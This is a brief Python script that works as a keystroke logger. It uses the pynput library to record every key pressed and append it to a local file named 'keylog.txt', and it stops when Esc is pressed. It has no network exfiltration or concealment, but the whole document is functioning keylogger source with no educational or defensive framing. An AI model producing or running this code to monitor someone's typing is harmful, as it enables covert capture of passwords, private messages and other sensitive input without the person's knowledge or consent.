from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "keylog.txt"

def on_press(key):
    try:
        # Open the log file in append mode
        with open(log_file, "a") as f:
            # Write the pressed key to the log file
            f.write(str(key) + "\n")
    except Exception as e:
        print(f"Error: {str(e)}")

def on_release(key):
    if key == Key.esc:
        # Stop the listener
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Keep the listener running
    listener.join()


